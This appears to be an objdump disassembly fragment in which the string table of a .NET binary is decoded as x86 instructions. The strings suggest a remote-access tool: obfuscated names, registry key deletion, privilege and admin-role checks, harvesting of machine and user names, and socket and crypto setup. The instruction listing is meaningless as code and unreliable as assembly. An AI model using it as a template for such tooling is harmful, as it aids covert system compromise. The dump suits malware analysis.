  4085b3:	61                   	popa
  4085b4:	74 65                	je     0x40861b
  4085b6:	49                   	dec    %ecx
  4085b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4085b8:	73 74                	jae    0x40862e
  4085ba:	61                   	popa
  4085bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4085bc:	63 65 00             	arpl   %esp,0x0(%ebp)
  4085bf:	4f                   	dec    %edi
  4085c0:	61                   	popa
  4085c1:	74 57                	je     0x40861a
  4085c3:	4a                   	dec    %edx
  4085c4:	62 66 78             	bound  %esp,0x78(%esi)
  4085c7:	62 75 4f             	bound  %esi,0x4f(%ebp)
  4085ca:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4085cf:	74 5f                	je     0x408630
  4085d1:	4d                   	dec    %ebp
  4085d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d3:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  4085d8:	6c                   	insb   (%dx),%es:(%edi)
  4085d9:	65 4d                	gs dec %ebp
  4085db:	6f                   	outsl  %ds:(%esi),(%dx)
  4085dc:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  4085e1:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  4085e8:	64 65 
  4085ea:	00 45 6e             	add    %al,0x6e(%ebp)
  4085ed:	74 65                	je     0x408654
  4085ef:	72 44                	jb     0x408635
  4085f1:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4085f5:	4d                   	dec    %ebp
  4085f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4085f7:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  4085fc:	79 70                	jns    0x40866e
  4085fe:	74 6f                	je     0x40866f
  408600:	53                   	push   %ebx
  408601:	74 72                	je     0x408675
  408603:	65 61                	gs popa
  408605:	6d                   	insl   (%dx),%es:(%edi)
  408606:	4d                   	dec    %ebp
  408607:	6f                   	outsl  %ds:(%esi),(%dx)
  408608:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  40860d:	6d                   	insl   (%dx),%es:(%edi)
  40860e:	70 72                	jo     0x408682
  408610:	65 73 73             	gs jae 0x408686
  408613:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  40861a:	00 43 69             	add    %al,0x69(%ebx)
  40861d:	70 68                	jo     0x408687
  40861f:	65 72 4d             	gs jb  0x40866f
  408622:	6f                   	outsl  %ds:(%esi),(%dx)
  408623:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  408628:	6c                   	insb   (%dx),%es:(%edi)
  408629:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  40862e:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  408634:	65 74 65             	gs je  0x40869c
  408637:	53                   	push   %ebx
  408638:	75 62                	jne    0x40869c
  40863a:	4b                   	dec    %ebx
  40863b:	65 79 54             	gs jns 0x408692
  40863e:	72 65                	jb     0x4086a5
  408640:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408644:	74 5f                	je     0x4086a5
  408646:	4d                   	dec    %ebp
  408647:	65 73 73             	gs jae 0x4086bd
  40864a:	61                   	popa
  40864b:	67 65 00 43 77       	add    %al,%gs:0x77(%bp,%di)
  408650:	76 5a                	jbe    0x4086ac
  408652:	46                   	inc    %esi
  408653:	70 57                	jo     0x4086ac
  408655:	52                   	push   %edx
  408656:	61                   	popa
  408657:	65 4b                	gs dec %ebx
  408659:	77 5a                	ja     0x4086b5
  40865b:	6d                   	insl   (%dx),%es:(%edi)
  40865c:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  408660:	6e                   	outsb  %ds:(%esi),(%dx)
  408661:	76 6f                	jbe    0x4086d2
  408663:	6b 65 00 53          	imul   $0x53,0x0(%ebp),%esp
  408667:	65 70 4e             	gs jo  0x4086b8
  40866a:	44                   	inc    %esp
  40866b:	46                   	inc    %esi
  40866c:	76 46                	jbe    0x4086b4
  40866e:	45                   	inc    %ebp
  40866f:	51                   	push   %ecx
  408670:	59                   	pop    %ecx
  408671:	52                   	push   %edx
  408672:	6c                   	insb   (%dx),%es:(%edi)
  408673:	65 00 49 45          	add    %cl,%gs:0x45(%ecx)
  408677:	6e                   	outsb  %ds:(%esi),(%dx)
  408678:	75 6d                	jne    0x4086e7
  40867a:	65 72 61             	gs jb  0x4086de
  40867d:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408681:	49                   	dec    %ecx
  408682:	44                   	inc    %esp
  408683:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  40868a:	6c                   	insb   (%dx),%es:(%edi)
  40868b:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  408690:	6f                   	outsl  %ds:(%esi),(%dx)
  408691:	75 62                	jne    0x4086f5
  408693:	6c                   	insb   (%dx),%es:(%edi)
  408694:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408698:	74 5f                	je     0x4086f9
  40869a:	48                   	dec    %eax
  40869b:	61                   	popa
  40869c:	6e                   	outsb  %ds:(%esi),(%dx)
  40869d:	64 6c                	fs insb (%dx),%es:(%edi)
  40869f:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4086a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086a4:	74 69                	je     0x40870f
  4086a6:	6d                   	insl   (%dx),%es:(%edi)
  4086a7:	65 46                	gs inc %esi
  4086a9:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  4086b0:	64 6c                	fs insb (%dx),%es:(%edi)
  4086b2:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4086b6:	74 4d                	je     0x408705
  4086b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4086b9:	64 75 6c             	fs jne 0x408728
  4086bc:	65 48                	gs dec %eax
  4086be:	61                   	popa
  4086bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c0:	64 6c                	fs insb (%dx),%es:(%edi)
  4086c2:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4086c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c7:	74 69                	je     0x408732
  4086c9:	6d                   	insl   (%dx),%es:(%edi)
  4086ca:	65 54                	gs push %esp
  4086cc:	79 70                	jns    0x40873e
  4086ce:	65 48                	gs dec %eax
  4086d0:	61                   	popa
  4086d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4086d2:	64 6c                	fs insb (%dx),%es:(%edi)
  4086d4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4086d8:	74 54                	je     0x40872e
  4086da:	79 70                	jns    0x40874c
  4086dc:	65 46                	gs inc %esi
  4086de:	72 6f                	jb     0x40874f
  4086e0:	6d                   	insl   (%dx),%es:(%edi)
  4086e1:	48                   	dec    %eax
  4086e2:	61                   	popa
  4086e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e4:	64 6c                	fs insb (%dx),%es:(%edi)
  4086e6:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  4086ea:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  4086f1:	65 
  4086f2:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  4086f6:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  4086fd:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408704:	6e 
  408705:	52                   	push   %edx
  408706:	6f                   	outsl  %ds:(%esi),(%dx)
  408707:	6c                   	insb   (%dx),%es:(%edi)
  408708:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  40870c:	6e                   	outsb  %ds:(%esi),(%dx)
  40870d:	64 6f                	outsl  %fs:(%esi),(%dx)
  40870f:	77 73                	ja     0x408784
  408711:	42                   	inc    %edx
  408712:	75 69                	jne    0x40877d
  408714:	6c                   	insb   (%dx),%es:(%edi)
  408715:	74 49                	je     0x408760
  408717:	6e                   	outsb  %ds:(%esi),(%dx)
  408718:	52                   	push   %edx
  408719:	6f                   	outsl  %ds:(%esi),(%dx)
  40871a:	6c                   	insb   (%dx),%es:(%edi)
  40871b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40871f:	74 5f                	je     0x408780
  408721:	4d                   	dec    %ebp
  408722:	61                   	popa
  408723:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40872a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40872e:	6f                   	outsl  %ds:(%esi),(%dx)
  40872f:	63 65 73             	arpl   %esp,0x73(%ebp)
  408732:	73 4d                	jae    0x408781
  408734:	6f                   	outsl  %ds:(%esi),(%dx)
  408735:	64 75 6c             	fs jne 0x4087a4
  408738:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40873c:	74 5f                	je     0x40879d
  40873e:	57                   	push   %edi
  40873f:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408746:	79 6c                	jns    0x4087b4
  408748:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40874c:	6f                   	outsl  %ds:(%esi),(%dx)
  40874d:	63 65 73             	arpl   %esp,0x73(%ebp)
  408750:	73 57                	jae    0x4087a9
  408752:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408759:	79 6c                	jns    0x4087c7
  40875b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40875f:	74 5f                	je     0x4087c0
  408761:	4e                   	dec    %esi
  408762:	61                   	popa
  408763:	6d                   	insl   (%dx),%es:(%edi)
  408764:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408768:	74 5f                	je     0x4087c9
  40876a:	46                   	inc    %esi
  40876b:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408772:	00 
  408773:	73 65                	jae    0x4087da
  408775:	74 5f                	je     0x4087d6
  408777:	46                   	inc    %esi
  408778:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40877f:	00 
  408780:	47                   	inc    %edi
  408781:	65 74 54             	gs je  0x4087d8
  408784:	65 6d                	gs insl (%dx),%es:(%edi)
  408786:	70 46                	jo     0x4087ce
  408788:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40878f:	00 
  408790:	47                   	inc    %edi
  408791:	65 74 46             	gs je  0x4087da
  408794:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40879b:	00 
  40879c:	67 65 74 5f          	addr16 gs je 0x4087ff
  4087a0:	4d                   	dec    %ebp
  4087a1:	61                   	popa
  4087a2:	63 68 69             	arpl   %ebp,0x69(%eax)
  4087a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4087a6:	65 4e                	gs dec %esi
  4087a8:	61                   	popa
  4087a9:	6d                   	insl   (%dx),%es:(%edi)
  4087aa:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087ae:	74 5f                	je     0x40880f
  4087b0:	4f                   	dec    %edi
  4087b1:	53                   	push   %ebx
  4087b2:	46                   	inc    %esi
  4087b3:	75 6c                	jne    0x408821
  4087b5:	6c                   	insb   (%dx),%es:(%edi)
  4087b6:	4e                   	dec    %esi
  4087b7:	61                   	popa
  4087b8:	6d                   	insl   (%dx),%es:(%edi)
  4087b9:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087bd:	74 5f                	je     0x40881e
  4087bf:	46                   	inc    %esi
  4087c0:	75 6c                	jne    0x40882e
  4087c2:	6c                   	insb   (%dx),%es:(%edi)
  4087c3:	4e                   	dec    %esi
  4087c4:	61                   	popa
  4087c5:	6d                   	insl   (%dx),%es:(%edi)
  4087c6:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087ca:	74 5f                	je     0x40882b
  4087cc:	55                   	push   %ebp
  4087cd:	73 65                	jae    0x408834
  4087cf:	72 4e                	jb     0x40881f
  4087d1:	61                   	popa
  4087d2:	6d                   	insl   (%dx),%es:(%edi)
  4087d3:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  4087d7:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  4087db:	6f                   	outsl  %ds:(%esi),(%dx)
  4087dc:	73 74                	jae    0x408852
  4087de:	4e                   	dec    %esi
  4087df:	61                   	popa
  4087e0:	6d                   	insl   (%dx),%es:(%edi)
  4087e1:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  4087e6:	65 54                	gs push %esp
  4087e8:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  4087ef:	5f                   	pop    %edi
  4087f0:	4c                   	dec    %esp
  4087f1:	61                   	popa
  4087f2:	73 74                	jae    0x408868
  4087f4:	57                   	push   %edi
  4087f5:	72 69                	jb     0x408860
  4087f7:	74 65                	je     0x40885e
  4087f9:	54                   	push   %esp
  4087fa:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  408801:	6e                   	outsb  %ds:(%esi),(%dx)
  408802:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408809:	54                   	push   %esp
  40880a:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  408811:	74 65                	je     0x408878
  408813:	4c                   	dec    %esp
  408814:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  40881b:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40881e:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408822:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408829:	6d                   	insl   (%dx),%es:(%edi)
  40882a:	65 54                	gs push %esp
  40882c:	79 70                	jns    0x40889e
  40882e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408832:	74 5f                	je     0x408893
  408834:	56                   	push   %esi
  408835:	61                   	popa
  408836:	6c                   	insb   (%dx),%es:(%edi)
  408837:	75 65                	jne    0x40889e
  408839:	54                   	push   %esp
  40883a:	79 70                	jns    0x4088ac
  40883c:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408840:	6f                   	outsl  %ds:(%esi),(%dx)
  408841:	74 6f                	je     0x4088b2
  408843:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408846:	54                   	push   %esp
  408847:	79 70                	jns    0x4088b9
  408849:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40884d:	74 54                	je     0x4088a3
  40884f:	79 70                	jns    0x4088c1
  408851:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408855:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408858:	74 54                	je     0x4088ae
  40885a:	79 70                	jns    0x4088cc
  40885c:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408860:	6c                   	insb   (%dx),%es:(%edi)
  408861:	65 53                	gs push %ebx
  408863:	68 61 72 65 00       	push   $0x657261
  408868:	53                   	push   %ebx
  408869:	79 73                	jns    0x4088de
  40886b:	74 65                	je     0x4088d2
  40886d:	6d                   	insl   (%dx),%es:(%edi)
  40886e:	2e 43                	cs inc %ebx
  408870:	6f                   	outsl  %ds:(%esi),(%dx)
  408871:	72 65                	jb     0x4088d8
  408873:	00 43 6c             	add    %al,0x6c(%ebx)
  408876:	6f                   	outsl  %ds:(%esi),(%dx)
  408877:	73 65                	jae    0x4088de
  408879:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40887d:	70 6f                	jo     0x4088ee
  40887f:	73 65                	jae    0x4088e6
  408881:	00 50 61             	add    %dl,0x61(%eax)
  408884:	72 73                	jb     0x4088f9
  408886:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  40888a:	72 52                	jb     0x4088de
  40888c:	65 76 65             	gs jbe 0x4088f4
  40888f:	72 73                	jb     0x408904
  408891:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  408895:	30 39                	xor    %bh,(%ecx)
  408897:	43                   	inc    %ebx
  408898:	65 72 74             	gs jb  0x40890f
  40889b:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4088a2:	00 43 72             	add    %al,0x72(%ebx)
  4088a5:	65 61                	gs popa
  4088a7:	74 65                	je     0x40890e
  4088a9:	00 53 65             	add    %dl,0x65(%ebx)
  4088ac:	74 54                	je     0x408902
  4088ae:	68 72 65 61 64       	push   $0x64616572
  4088b3:	45                   	inc    %ebp
  4088b4:	78 65                	js     0x40891b
  4088b6:	63 75 74             	arpl   %esi,0x74(%ebp)
  4088b9:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4088c0:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4088c5:	65 74 65             	gs je  0x40892d
  4088c8:	00 43 61             	add    %al,0x61(%ebx)
  4088cb:	6c                   	insb   (%dx),%es:(%edi)
  4088cc:	6c                   	insb   (%dx),%es:(%edi)
  4088cd:	53                   	push   %ebx
  4088ce:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  4088d5:	74 
  4088d6:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4088da:	6d                   	insl   (%dx),%es:(%edi)
  4088db:	70 69                	jo     0x408946
  4088dd:	6c                   	insb   (%dx),%es:(%edi)
  4088de:	65 72 47             	gs jb  0x408928
  4088e1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4088e3:	65 72 61             	gs jb  0x408947
  4088e6:	74 65                	je     0x40894d
  4088e8:	64 41                	fs inc %ecx
  4088ea:	74 74                	je     0x408960
  4088ec:	72 69                	jb     0x408957
  4088ee:	62 75 74             	bound  %esi,0x74(%ebp)
  4088f1:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4088f6:	75 67                	jne    0x40895f
  4088f8:	67 61                	addr16 popa
  4088fa:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4088fe:	74 74                	je     0x408974
  408900:	72 69                	jb     0x40896b
  408902:	62 75 74             	bound  %esi,0x74(%ebp)
  408905:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408909:	6d                   	insl   (%dx),%es:(%edi)
  40890a:	56                   	push   %esi
  40890b:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408912:	74 74                	je     0x408988
  408914:	72 69                	jb     0x40897f
  408916:	62 75 74             	bound  %esi,0x74(%ebp)
  408919:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40891d:	73 65                	jae    0x408984
  40891f:	6d                   	insl   (%dx),%es:(%edi)
  408920:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408924:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40892b:	72 
  40892c:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408933:	73 73                	jae    0x4089a8
  408935:	65 6d                	gs insl (%dx),%es:(%edi)
  408937:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40893b:	72 61                	jb     0x40899e
  40893d:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408940:	61                   	popa
  408941:	72 6b                	jb     0x4089ae
  408943:	41                   	inc    %ecx
  408944:	74 74                	je     0x4089ba
  408946:	72 69                	jb     0x4089b1
  408948:	62 75 74             	bound  %esi,0x74(%ebp)
  40894b:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408950:	67 65 74 46          	addr16 gs je 0x40899a
  408954:	72 61                	jb     0x4089b7
  408956:	6d                   	insl   (%dx),%es:(%edi)
  408957:	65 77 6f             	gs ja  0x4089c9
  40895a:	72 6b                	jb     0x4089c7
  40895c:	41                   	inc    %ecx
  40895d:	74 74                	je     0x4089d3
  40895f:	72 69                	jb     0x4089ca
  408961:	62 75 74             	bound  %esi,0x74(%ebp)
  408964:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408968:	73 65                	jae    0x4089cf
  40896a:	6d                   	insl   (%dx),%es:(%edi)
  40896b:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40896f:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  408976:	69 
  408977:	6f                   	outsl  %ds:(%esi),(%dx)
  408978:	6e                   	outsb  %ds:(%esi),(%dx)
  408979:	41                   	inc    %ecx
  40897a:	74 74                	je     0x4089f0
  40897c:	72 69                	jb     0x4089e7
  40897e:	62 75 74             	bound  %esi,0x74(%ebp)
  408981:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408985:	73 65                	jae    0x4089ec
  408987:	6d                   	insl   (%dx),%es:(%edi)
  408988:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40898c:	6f                   	outsl  %ds:(%esi),(%dx)
  40898d:	6e                   	outsb  %ds:(%esi),(%dx)
  40898e:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  408994:	74 69                	je     0x4089ff
  408996:	6f                   	outsl  %ds:(%esi),(%dx)
  408997:	6e                   	outsb  %ds:(%esi),(%dx)
  408998:	41                   	inc    %ecx
  408999:	74 74                	je     0x408a0f
  40899b:	72 69                	jb     0x408a06
  40899d:	62 75 74             	bound  %esi,0x74(%ebp)
  4089a0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089a4:	73 65                	jae    0x408a0b
  4089a6:	6d                   	insl   (%dx),%es:(%edi)
  4089a7:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4089ab:	65 73 63             	gs jae 0x408a11
  4089ae:	72 69                	jb     0x408a19
  4089b0:	70 74                	jo     0x408a26
  4089b2:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4089b9:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4089c0:	65 66 61             	gs popaw
  4089c3:	75 6c                	jne    0x408a31
  4089c5:	74 4d                	je     0x408a14
  4089c7:	65 6d                	gs insl (%dx),%es:(%edi)
  4089c9:	62 65 72             	bound  %esp,0x72(%ebp)
  4089cc:	41                   	inc    %ecx
  4089cd:	74 74                	je     0x408a43
  4089cf:	72 69                	jb     0x408a3a
  4089d1:	62 75 74             	bound  %esi,0x74(%ebp)
  4089d4:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4089d8:	6d                   	insl   (%dx),%es:(%edi)
  4089d9:	70 69                	jo     0x408a44
  4089db:	6c                   	insb   (%dx),%es:(%edi)
  4089dc:	61                   	popa
  4089dd:	74 69                	je     0x408a48
  4089df:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e1:	52                   	push   %edx
  4089e2:	65 6c                	gs insb (%dx),%es:(%edi)
  4089e4:	61                   	popa
  4089e5:	78 61                	js     0x408a48
  4089e7:	74 69                	je     0x408a52
  4089e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4089eb:	73 41                	jae    0x408a2e
  4089ed:	74 74                	je     0x408a63
  4089ef:	72 69                	jb     0x408a5a
  4089f1:	62 75 74             	bound  %esi,0x74(%ebp)
  4089f4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089f8:	73 65                	jae    0x408a5f
  4089fa:	6d                   	insl   (%dx),%es:(%edi)
  4089fb:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  4089ff:	72 6f                	jb     0x408a70
  408a01:	64 75 63             	fs jne 0x408a67
  408a04:	74 41                	je     0x408a47
  408a06:	74 74                	je     0x408a7c
  408a08:	72 69                	jb     0x408a73
  408a0a:	62 75 74             	bound  %esi,0x74(%ebp)
  408a0d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a11:	73 65                	jae    0x408a78
  408a13:	6d                   	insl   (%dx),%es:(%edi)
  408a14:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408a18:	6f                   	outsl  %ds:(%esi),(%dx)
  408a19:	70 79                	jo     0x408a94
  408a1b:	72 69                	jb     0x408a86
  408a1d:	67 68 74 41 74 74    	addr16 push $0x74744174
  408a23:	72 69                	jb     0x408a8e
  408a25:	62 75 74             	bound  %esi,0x74(%ebp)
  408a28:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a2c:	73 65                	jae    0x408a93
  408a2e:	6d                   	insl   (%dx),%es:(%edi)
  408a2f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408a33:	6f                   	outsl  %ds:(%esi),(%dx)
  408a34:	6d                   	insl   (%dx),%es:(%edi)
  408a35:	70 61                	jo     0x408a98
  408a37:	6e                   	outsb  %ds:(%esi),(%dx)
  408a38:	79 41                	jns    0x408a7b
  408a3a:	74 74                	je     0x408ab0
  408a3c:	72 69                	jb     0x408aa7
  408a3e:	62 75 74             	bound  %esi,0x74(%ebp)
  408a41:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408a45:	6e                   	outsb  %ds:(%esi),(%dx)
  408a46:	74 69                	je     0x408ab1
  408a48:	6d                   	insl   (%dx),%es:(%edi)
  408a49:	65 43                	gs inc %ebx
  408a4b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a4c:	6d                   	insl   (%dx),%es:(%edi)
  408a4d:	70 61                	jo     0x408ab0
  408a4f:	74 69                	je     0x408aba
  408a51:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408a54:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408a5b:	69 
  408a5c:	62 75 74             	bound  %esi,0x74(%ebp)
  408a5f:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408a63:	74 5f                	je     0x408ac4
  408a65:	55                   	push   %ebp
  408a66:	73 65                	jae    0x408acd
  408a68:	53                   	push   %ebx
  408a69:	68 65 6c 6c 45       	push   $0x456c6c65
  408a6e:	78 65                	js     0x408ad5
  408a70:	63 75 74             	arpl   %esi,0x74(%ebp)
  408a73:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408a77:	61                   	popa
  408a78:	64 42                	fs inc %edx
  408a7a:	79 74                	jns    0x408af0
  408a7c:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408a80:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408a87:	00 
  408a88:	44                   	inc    %esp
  408a89:	65 6c                	gs insb (%dx),%es:(%edi)
  408a8b:	65 74 65             	gs je  0x408af3
  408a8e:	56                   	push   %esi
  408a8f:	61                   	popa
  408a90:	6c                   	insb   (%dx),%es:(%edi)
  408a91:	75 65                	jne    0x408af8
  408a93:	00 47 65             	add    %al,0x65(%edi)
  408a96:	74 56                	je     0x408aee
  408a98:	61                   	popa
  408a99:	6c                   	insb   (%dx),%es:(%edi)
  408a9a:	75 65                	jne    0x408b01
  408a9c:	00 53 65             	add    %dl,0x65(%ebx)
  408a9f:	74 56                	je     0x408af7
  408aa1:	61                   	popa
  408aa2:	6c                   	insb   (%dx),%es:(%edi)
  408aa3:	75 65                	jne    0x408b0a
  408aa5:	00 67 65             	add    %ah,0x65(%edi)
  408aa8:	74 5f                	je     0x408b09
  408aaa:	4b                   	dec    %ebx
  408aab:	65 65 70 41          	gs gs jo 0x408af0
  408aaf:	6c                   	insb   (%dx),%es:(%edi)
  408ab0:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408ab7:	5f                   	pop    %edi
  408ab8:	4b                   	dec    %ebx
  408ab9:	65 65 70 41          	gs gs jo 0x408afe
  408abd:	6c                   	insb   (%dx),%es:(%edi)
  408abe:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408ac5:	6f                   	outsl  %ds:(%esi),(%dx)
  408ac6:	76 65                	jbe    0x408b2d
  408ac8:	00 73 65             	add    %dh,0x65(%ebx)
  408acb:	74 5f                	je     0x408b2c
  408acd:	42                   	inc    %edx
  408ace:	6c                   	insb   (%dx),%es:(%edi)
  408acf:	6f                   	outsl  %ds:(%esi),(%dx)
  408ad0:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408ad3:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408ada:	5f                   	pop    %edi
  408adb:	54                   	push   %esp
  408adc:	6f                   	outsl  %ds:(%esi),(%dx)
  408add:	74 61                	je     0x408b40
  408adf:	6c                   	insb   (%dx),%es:(%edi)
  408ae0:	53                   	push   %ebx
  408ae1:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408ae8:	5f                   	pop    %edi
  408ae9:	48                   	dec    %eax
  408aea:	65 61                	gs popa
  408aec:	64 65 72 53          	fs gs jb 0x408b43
  408af0:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408af7:	5f                   	pop    %edi
  408af8:	48                   	dec    %eax
  408af9:	65 61                	gs popa
  408afb:	64 65 72 53          	fs gs jb 0x408b52
  408aff:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408b06:	5f                   	pop    %edi
  408b07:	53                   	push   %ebx
  408b08:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b0a:	64 42                	fs inc %edx
  408b0c:	75 66                	jne    0x408b74
  408b0e:	66 65 72 53          	data16 gs jb 0x408b65
